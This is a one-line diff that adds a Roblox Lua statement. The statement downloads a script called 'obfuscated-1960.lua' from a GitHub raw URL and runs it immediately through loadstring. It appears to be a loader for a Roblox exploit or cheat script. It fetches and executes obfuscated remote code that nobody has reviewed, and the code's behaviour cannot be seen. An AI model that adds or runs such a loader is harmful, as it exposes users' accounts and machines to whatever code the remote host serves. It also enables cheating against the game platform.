@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Jimmper/Robloxscripts/main/obfuscated-1960.lua'))()
